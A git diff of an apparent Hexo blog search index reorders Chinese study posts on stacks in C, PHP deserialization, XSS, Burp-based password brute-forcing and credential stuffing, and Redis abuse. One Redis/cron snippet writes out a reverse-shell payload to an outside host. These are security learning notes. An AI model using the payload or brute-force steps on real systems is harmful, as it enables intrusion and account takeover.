@@ -19,34 +19,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>数据结构：栈</title>
-    <url>/posts/1123954996.html</url>
-    <content><![CDATA[<h2 id="栈-Stack"><a href="#栈-Stack" class="headerlink" title="栈  Stack"></a>栈  Stack</h2><ul>
-<li>栈是限定仅在表尾进行插入或删除操作的线性表。因此，对栈来说，表尾端有其特殊含义，称为栈顶，相应的，表头端称为栈底。不含元素的空表称为空栈。</li>
-</ul>
-<h3 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h3><ul>
-<li>栈的顺序存储结构是利用一组地址连续的存储单元依次存放自栈底到栈顶的数据元素，同时附设指针top&#x3D;0表示空栈。但在C语言中数组的下标 从0开始，且由于栈在使用过程中所需最大空间的大小很难估计，因此，一般来说，在初始化设空栈时不应限定栈的最大容量。<br>一个较合理的做法是：先为栈分配一个基本容量，然后再应用过程中，当斩的空间不够使用时再逐段扩大。为此可设定两个常量：STACK_INIT_SIZE(存储空间初始分配变量)和STACKINCREMENT(存储空间分配增量)。</li>
-</ul>
-<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    SElemType  *base;</span><br><span class="line">    SElemType  *top;</span><br><span class="line">    <span class="type">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure>
-<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ul>
-<li>栈顶指针top指向栈顶元素：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span> <span class="params">(Stack &amp;S)</span>&#123;</span><br><span class="line">    S.top = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li>栈顶指针top指向栈顶元素的下一位置：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span> <span class="params">(Stack &amp;S)</span>&#123;</span><br><span class="line">    S.top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="栈空判断"><a href="#栈空判断" class="headerlink" title="栈空判断"></a>栈空判断</h3><ul>
-<li>栈顶指针top指向栈顶元素：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool EmptyStack (Stack &amp;S)&#123;</span><br><span class="line">    if (S.top == -1) </span><br><span class="line">        return true;</span><br><span class="line">    else </span><br><span class="line">        return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li>栈顶指针top指向栈顶元素：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">FullStack</span> <span class="params">(Stack &amp;S)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.top == NUM<span class="number">-1</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li>栈顶指针top指向栈顶元素的下一位置:<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">FullStack</span> <span class="params">(Stack &amp;S)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.top == NUM) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="栈的进制转换（二进制转为八进制）"><a href="#栈的进制转换（二进制转为八进制）" class="headerlink" title="栈的进制转换（二进制转为八进制）"></a>栈的进制转换（二进制转为八进制）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">conversion</span> <span class="params">(SqStack&amp; S)</span> &#123;</span><br><span class="line">	<span class="type">int</span> N;</span><br><span class="line">	<span class="type">int</span> e;</span><br><span class="line">    InitStack(S);  </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">while</span> (N) &#123;</span><br><span class="line">         Push(S, N % <span class="number">8</span>); </span><br><span class="line">         N = N/<span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!StackEmpty(S)) &#123;</span><br><span class="line">         Pop(S,e);</span><br><span class="line">         <span class="built_in">printf</span> ( <span class="string">&quot;%d&quot;</span>, e );</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125; <span class="comment">// conversion</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>完整代码<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  TRUE           1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  FALSE          0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  OK             1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  ERROR          0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  INFEASIBLE     -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OVERFLOW -2</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="type">int</span>  Status;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SElemType;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_INIT_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACKINCREMENT 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">               SElemType *base;</span><br><span class="line">               SElemType  *top;</span><br><span class="line">               <span class="type">int</span> stacksize;</span><br><span class="line">               &#125;SqStack;</span><br><span class="line">Status <span class="title function_">InitStack</span><span class="params">(SqStack &amp;S)</span> &#123;</span><br><span class="line">	S.base = (SElemType *)<span class="built_in">malloc</span>   (STACK_INIT_SIZE*<span class="keyword">sizeof</span> (SElemType));</span><br><span class="line">	<span class="keyword">if</span> (!S.base) <span class="built_in">exit</span> (OVERFLOW);</span><br><span class="line">	S.top = S.base;</span><br><span class="line">	S.stacksize = STACK_INIT_SIZE;</span><br><span class="line">	<span class="keyword">return</span> OK;</span><br><span class="line">     &#125; <span class="comment">//InitStack</span></span><br><span class="line">Status <span class="title function_">Push</span><span class="params">(SqStack &amp;S, SElemType e)</span> &#123;</span><br><span class="line">	   <span class="keyword">if</span> (S.top-S.base&gt;=S.stacksize) <span class="comment">//Õ»Âú</span></span><br><span class="line">	    &#123; S.base=(SElemType *)<span class="built_in">realloc</span></span><br><span class="line">	      (S.base, (S.stacksize+STACKINCREMENT)</span><br><span class="line">	      * <span class="keyword">sizeof</span>(SElemType));</span><br><span class="line">	      <span class="keyword">if</span> (!S.base) <span class="built_in">exit</span> (OVERFLOW);</span><br><span class="line">	      S.top   = S.base + S.stacksize; </span><br><span class="line">	      S.stacksize+=STACKINCREMENT; </span><br><span class="line">	       &#125;  <span class="comment">// if</span></span><br><span class="line">	    *S.top++ = e;   <span class="keyword">return</span> OK; &#125;  <span class="comment">//Push</span></span><br><span class="line">Status <span class="title function_">Pop</span><span class="params">(SqStack &amp;S, SElemType &amp;e)</span> &#123;</span><br><span class="line">	  <span class="keyword">if</span>(S.top == S.base)<span class="keyword">return</span> ERROR; </span><br><span class="line">	 e = * -- S.top;</span><br><span class="line">	 <span class="keyword">return</span> OK;</span><br><span class="line">	&#125; <span class="comment">//Pop    </span></span><br><span class="line">Status <span class="title function_">StackEmpty</span><span class="params">(SqStack S)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (S.base==S.top)</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">  <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">conversion</span> <span class="params">(SqStack&amp; S)</span> &#123;</span><br><span class="line">	<span class="type">int</span> N;</span><br><span class="line">	<span class="type">int</span> e;</span><br><span class="line">    InitStack(S);  </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">while</span> (N) &#123;</span><br><span class="line">         Push(S, N % <span class="number">8</span>); </span><br><span class="line">         N = N/<span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!StackEmpty(S)) &#123;</span><br><span class="line">         Pop(S,e);</span><br><span class="line">         <span class="built_in">printf</span> ( <span class="string">&quot;%d&quot;</span>, e );</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125; <span class="comment">// conversion</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SqStack S;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Please input a number to conver\n&quot;</span>);</span><br><span class="line">	conversion(S);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Please any key to continue\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>数据结构</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hexo修改主题</title>
     <url>/posts/38893.html</url>
     <content><![CDATA[<ul>
@@ -83,6 +55,61 @@
 ]]></content>
       <tags>
         <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP反序列化</title>
+    <url>/posts/2328281505.html</url>
+    <content><![CDATA[<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><ul>
+<li>PHP序列化给我们传递对象提供了-种简单的方法。将一个复杂的数据类型转换为字符串(序列化)存储在本地。在用到的时候能很方便地将硬盘上的字符串数据转换回原始的数据类型(反序列化)。</li>
+</ul>
+<p>序列化的函数为serialize (编码)  </p>
+<p>反序列化的函数为unserialize (解码)  </p>
+<p>序列化和反序列化的目的是使得程序间传输对象会更加方便。  </p>
+<p>当serialize序列化对象时，PHP将试图在序列动作之前调用该对象的成员函数__sleep0, 这样就允许对象在被序列化之前做任何清除操作。  </p>
+<p>类似的，当使用unserialize(恢复对象时，将调用__wakeup( 成员函数。这也是PHP反序列化经典的考点，CTF比赛中很多都是围绕着PHP反序列化对象的特性来突然getshell的，所以学习反序列化前得掌握「PHP基础的类与对象」。  </p>
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><ul>
+<li><a href="https://www.sqlsec.com/2020/09/xdebug.html">https://www.sqlsec.com/2020/09/xdebug.html</a><br>记得改端口，将端口改为9000<br>调试：首先设置断点，开始调试，</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>数据结构：栈</title>
+    <url>/posts/1123954996.html</url>
+    <content><![CDATA[<h2 id="栈-Stack"><a href="#栈-Stack" class="headerlink" title="栈  Stack"></a>栈  Stack</h2><ul>
+<li>栈是限定仅在表尾进行插入或删除操作的线性表。因此，对栈来说，表尾端有其特殊含义，称为栈顶，相应的，表头端称为栈底。不含元素的空表称为空栈。</li>
+</ul>
+<h3 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h3><ul>
+<li>栈的顺序存储结构是利用一组地址连续的存储单元依次存放自栈底到栈顶的数据元素，同时附设指针top&#x3D;0表示空栈。但在C语言中数组的下标 从0开始，且由于栈在使用过程中所需最大空间的大小很难估计，因此，一般来说，在初始化设空栈时不应限定栈的最大容量。<br>一个较合理的做法是：先为栈分配一个基本容量，然后再应用过程中，当斩的空间不够使用时再逐段扩大。为此可设定两个常量：STACK_INIT_SIZE(存储空间初始分配变量)和STACKINCREMENT(存储空间分配增量)。</li>
+</ul>
+<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    SElemType  *base;</span><br><span class="line">    SElemType  *top;</span><br><span class="line">    <span class="type">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure>
+<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ul>
+<li>栈顶指针top指向栈顶元素：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span> <span class="params">(Stack &amp;S)</span>&#123;</span><br><span class="line">    S.top = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>栈顶指针top指向栈顶元素的下一位置：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span> <span class="params">(Stack &amp;S)</span>&#123;</span><br><span class="line">    S.top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="栈空判断"><a href="#栈空判断" class="headerlink" title="栈空判断"></a>栈空判断</h3><ul>
+<li>栈顶指针top指向栈顶元素：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool EmptyStack (Stack &amp;S)&#123;</span><br><span class="line">    if (S.top == -1) </span><br><span class="line">        return true;</span><br><span class="line">    else </span><br><span class="line">        return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>栈顶指针top指向栈顶元素：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">FullStack</span> <span class="params">(Stack &amp;S)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.top == NUM<span class="number">-1</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>栈顶指针top指向栈顶元素的下一位置:<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">FullStack</span> <span class="params">(Stack &amp;S)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.top == NUM) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="栈的进制转换（二进制转为八进制）"><a href="#栈的进制转换（二进制转为八进制）" class="headerlink" title="栈的进制转换（二进制转为八进制）"></a>栈的进制转换（二进制转为八进制）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">conversion</span> <span class="params">(SqStack&amp; S)</span> &#123;</span><br><span class="line">	<span class="type">int</span> N;</span><br><span class="line">	<span class="type">int</span> e;</span><br><span class="line">    InitStack(S);  </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">while</span> (N) &#123;</span><br><span class="line">         Push(S, N % <span class="number">8</span>); </span><br><span class="line">         N = N/<span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!StackEmpty(S)) &#123;</span><br><span class="line">         Pop(S,e);</span><br><span class="line">         <span class="built_in">printf</span> ( <span class="string">&quot;%d&quot;</span>, e );</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125; <span class="comment">// conversion</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>完整代码<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  TRUE           1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  FALSE          0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  OK             1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  ERROR          0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  INFEASIBLE     -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OVERFLOW -2</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="type">int</span>  Status;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SElemType;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_INIT_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACKINCREMENT 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">               SElemType *base;</span><br><span class="line">               SElemType  *top;</span><br><span class="line">               <span class="type">int</span> stacksize;</span><br><span class="line">               &#125;SqStack;</span><br><span class="line">Status <span class="title function_">InitStack</span><span class="params">(SqStack &amp;S)</span> &#123;</span><br><span class="line">	S.base = (SElemType *)<span class="built_in">malloc</span>   (STACK_INIT_SIZE*<span class="keyword">sizeof</span> (SElemType));</span><br><span class="line">	<span class="keyword">if</span> (!S.base) <span class="built_in">exit</span> (OVERFLOW);</span><br><span class="line">	S.top = S.base;</span><br><span class="line">	S.stacksize = STACK_INIT_SIZE;</span><br><span class="line">	<span class="keyword">return</span> OK;</span><br><span class="line">     &#125; <span class="comment">//InitStack</span></span><br><span class="line">Status <span class="title function_">Push</span><span class="params">(SqStack &amp;S, SElemType e)</span> &#123;</span><br><span class="line">	   <span class="keyword">if</span> (S.top-S.base&gt;=S.stacksize) <span class="comment">//Õ»Âú</span></span><br><span class="line">	    &#123; S.base=(SElemType *)<span class="built_in">realloc</span></span><br><span class="line">	      (S.base, (S.stacksize+STACKINCREMENT)</span><br><span class="line">	      * <span class="keyword">sizeof</span>(SElemType));</span><br><span class="line">	      <span class="keyword">if</span> (!S.base) <span class="built_in">exit</span> (OVERFLOW);</span><br><span class="line">	      S.top   = S.base + S.stacksize; </span><br><span class="line">	      S.stacksize+=STACKINCREMENT; </span><br><span class="line">	       &#125;  <span class="comment">// if</span></span><br><span class="line">	    *S.top++ = e;   <span class="keyword">return</span> OK; &#125;  <span class="comment">//Push</span></span><br><span class="line">Status <span class="title function_">Pop</span><span class="params">(SqStack &amp;S, SElemType &amp;e)</span> &#123;</span><br><span class="line">	  <span class="keyword">if</span>(S.top == S.base)<span class="keyword">return</span> ERROR; </span><br><span class="line">	 e = * -- S.top;</span><br><span class="line">	 <span class="keyword">return</span> OK;</span><br><span class="line">	&#125; <span class="comment">//Pop    </span></span><br><span class="line">Status <span class="title function_">StackEmpty</span><span class="params">(SqStack S)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (S.base==S.top)</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">  <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">conversion</span> <span class="params">(SqStack&amp; S)</span> &#123;</span><br><span class="line">	<span class="type">int</span> N;</span><br><span class="line">	<span class="type">int</span> e;</span><br><span class="line">    InitStack(S);  </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">while</span> (N) &#123;</span><br><span class="line">         Push(S, N % <span class="number">8</span>); </span><br><span class="line">         N = N/<span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!StackEmpty(S)) &#123;</span><br><span class="line">         Pop(S,e);</span><br><span class="line">         <span class="built_in">printf</span> ( <span class="string">&quot;%d&quot;</span>, e );</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125; <span class="comment">// conversion</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SqStack S;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Please input a number to conver\n&quot;</span>);</span><br><span class="line">	conversion(S);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Please any key to continue\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>数据结构之队列</title>
+    <url>/posts/3568722733.html</url>
+    <content><![CDATA[]]></content>
+      <tags>
+        <tag>数据结构</tag>
       </tags>
   </entry>
   <entry>
@@ -167,25 +194,6 @@
       </tags>
   </entry>
   <entry>
-    <title>PHP反序列化</title>
-    <url>/posts/2328281505.html</url>
-    <content><![CDATA[<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><ul>
-<li>PHP序列化给我们传递对象提供了-种简单的方法。将一个复杂的数据类型转换为字符串(序列化)存储在本地。在用到的时候能很方便地将硬盘上的字符串数据转换回原始的数据类型(反序列化)。</li>
-</ul>
-<p>序列化的函数为serialize (编码)  </p>
-<p>反序列化的函数为unserialize (解码)  </p>
-<p>序列化和反序列化的目的是使得程序间传输对象会更加方便。  </p>
-<p>当serialize序列化对象时，PHP将试图在序列动作之前调用该对象的成员函数__sleep0, 这样就允许对象在被序列化之前做任何清除操作。  </p>
-<p>类似的，当使用unserialize(恢复对象时，将调用__wakeup( 成员函数。这也是PHP反序列化经典的考点，CTF比赛中很多都是围绕着PHP反序列化对象的特性来突然getshell的，所以学习反序列化前得掌握「PHP基础的类与对象」。  </p>
-<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><ul>
-<li><a href="https://www.sqlsec.com/2020/09/xdebug.html">https://www.sqlsec.com/2020/09/xdebug.html</a><br>记得改端口，将端口改为9000<br>调试：首先设置断点，开始调试，</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>网络安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XSS</title>
     <url>/posts/3909557445.html</url>
     <content><![CDATA[<h3 id="针对HTML的注入"><a href="#针对HTML的注入" class="headerlink" title="针对HTML的注入"></a>针对HTML的注入</h3><h2 id="XSS简介："><a href="#XSS简介：" class="headerlink" title="XSS简介："></a>XSS简介：</h2><ul>
@@ -200,6 +208,51 @@
 </ul>
 <h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><ul>
 <li>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。他和反射型XSS和存储型XSS的差别在于DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器的DOM解析，可以认为完全就是客户端的事。<br><img src="/posts/3909557445/2.png"></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>密码爆破</title>
+    <url>/posts/29527.html</url>
+    <content><![CDATA[<h2 id="Web认证爆破"><a href="#Web认证爆破" class="headerlink" title="Web认证爆破"></a>Web认证爆破</h2><h3 id="四位数字爆破。"><a href="#四位数字爆破。" class="headerlink" title="四位数字爆破。"></a>四位数字爆破。</h3><ul>
+<li>抓包添加payload，设置密码模块为数字即可，范围0000-9999<br>数字格式：<br>基地：Decimal<br>整数部分的最小位数：4<br>少数民族最小位数：0<br>少数最大字数：0<br>通过长度判断正确包</li>
+</ul>
+<h3 id="简单的脱弱口令爆破："><a href="#简单的脱弱口令爆破：" class="headerlink" title="简单的脱弱口令爆破："></a>简单的脱弱口令爆破：</h3><p>找一个好用的字典，设置爆破参数和类型，加载字典。通过返回包长度判断。</p>
+<h3 id="带验证码爆破？"><a href="#带验证码爆破？" class="headerlink" title="带验证码爆破？"></a>带验证码爆破？</h3><p>注意：不要放包，只要一直不放包，验证码就不会失效，否则，验证码改变会导致爆破不成功。 （验证码复用）其余一样。</p>
+<h3 id="Basic认证爆破"><a href="#Basic认证爆破" class="headerlink" title="Basic认证爆破"></a>Basic认证爆破</h3><ul>
+<li>打开发现是一个类似于basic认证的框，输入数据抓包。<br>发现是base64加密字段，推测basic字段是 用户名：密码 这种格式的base64加密形式。在xintruder中添加basic的加密字段，payload1选择自定义迭代器（Custom itermtor）。<br>然后设置定位分隔符和用户名，在位置2添加密码即可<br>然后在有效荷载里面添加base64编码模块<br>因为base64会自动编码特殊字符，需要取消后面的payload url自动编码</li>
+</ul>
+<h3 id="前端加密爆破"><a href="#前端加密爆破" class="headerlink" title="前端加密爆破"></a>前端加密爆破</h3><ul>
+<li>随便输入密码，发现密码是一串MD5值，解密发现是输入的密码，猜测是前端加密，同样的发送到intruder模块进行设置。<br>在payload的编码设置添加hash的md5加密模块</li>
+</ul>
+<h3 id="泄露数据撞库"><a href="#泄露数据撞库" class="headerlink" title="泄露数据撞库"></a>泄露数据撞库</h3><p><img src="/posts/29527/First.png" alt="例题"></p>
+<ul>
+<li>bp抓包，清掉所有变量，标记密码用户名，选择音叉攻击（一一对应的攻击），导入密码用户名开始攻击。通过返回长度找到正确的账号密码。<br><img src="/posts/29527/Second.png"></li>
+</ul>
+<h3 id="返回包特征提取爆破"><a href="#返回包特征提取爆破" class="headerlink" title="返回包特征提取爆破"></a>返回包特征提取爆破</h3><p><img src="/posts/29527/3.png"><br>若登陆成功和登陆失败返回的长度一样，则在options添加选项中，从返回包中获取返回的字段，可以直接在返回包中看到结果  </p>
+<h3 id="数据包传输类型"><a href="#数据包传输类型" class="headerlink" title="数据包传输类型"></a>数据包传输类型</h3><ul>
+<li>application….from urlLencode</li>
+<li>payload打开密码字典以换行为分割</li>
+<li>批量请求，寻找flag</li>
+</ul>
+<h3 id="简单的token验证"><a href="#简单的token验证" class="headerlink" title="简单的token验证"></a>简单的token验证</h3><ul>
+<li>token时间戳验证</li>
+</ul>
+<h3 id="识别验证码爆破"><a href="#识别验证码爆破" class="headerlink" title="识别验证码爆破"></a>识别验证码爆破</h3><p><img src="/posts/29527/4.png"></p>
+<ul>
+<li>工具：PKAV HTTP Fuzzer</li>
+<li>验证码识别重放模式为单线程</li>
+<li>这次比之前增加了验证码验证模块，码源提示ocr，容易想到利用burp的插件来进行验证码识别爆破。<br>这里用的是captcha-killer插件，开源地址：<a href="http://github.com/c0ny1/captcha-killer">http://github.com/c0ny1/captcha-killer</a><br>先利用burp抓取生成验证码页面，发送到插件的验证码识别模块。</li>
+</ul>
+<h2 id="防止爆破的方法"><a href="#防止爆破的方法" class="headerlink" title="防止爆破的方法"></a>防止爆破的方法</h2><ul>
+<li>多因素认证，爆破次数太多会锁定，但漏洞会导致管理也无法登录。</li>
+<li>sso————统一登陆认证</li>
+<li>加密</li>
+<li>token</li>
+<li>验证码</li>
 </ul>
 ]]></content>
       <tags>
@@ -345,51 +398,6 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 分 时 日 月 星期 要运行的命令</span><br></pre></td></tr></table></figure>
 <h3 id="nc命令教程"><a href="#nc命令教程" class="headerlink" title="nc命令教程"></a>nc命令教程</h3><ul>
 <li>nc被誉为网络安全界的瑞士军刀，一个简单而有用的工具，通过使用TCP或UDP协议的网络数据连接去读写数据<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set x &quot;\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.211.55.2/2333 0&gt;&amp;1\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>网络安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>密码爆破</title>
-    <url>/posts/29527.html</url>
-    <content><![CDATA[<h2 id="Web认证爆破"><a href="#Web认证爆破" class="headerlink" title="Web认证爆破"></a>Web认证爆破</h2><h3 id="四位数字爆破。"><a href="#四位数字爆破。" class="headerlink" title="四位数字爆破。"></a>四位数字爆破。</h3><ul>
-<li>抓包添加payload，设置密码模块为数字即可，范围0000-9999<br>数字格式：<br>基地：Decimal<br>整数部分的最小位数：4<br>少数民族最小位数：0<br>少数最大字数：0<br>通过长度判断正确包</li>
-</ul>
-<h3 id="简单的脱弱口令爆破："><a href="#简单的脱弱口令爆破：" class="headerlink" title="简单的脱弱口令爆破："></a>简单的脱弱口令爆破：</h3><p>找一个好用的字典，设置爆破参数和类型，加载字典。通过返回包长度判断。</p>
-<h3 id="带验证码爆破？"><a href="#带验证码爆破？" class="headerlink" title="带验证码爆破？"></a>带验证码爆破？</h3><p>注意：不要放包，只要一直不放包，验证码就不会失效，否则，验证码改变会导致爆破不成功。 （验证码复用）其余一样。</p>
-<h3 id="Basic认证爆破"><a href="#Basic认证爆破" class="headerlink" title="Basic认证爆破"></a>Basic认证爆破</h3><ul>
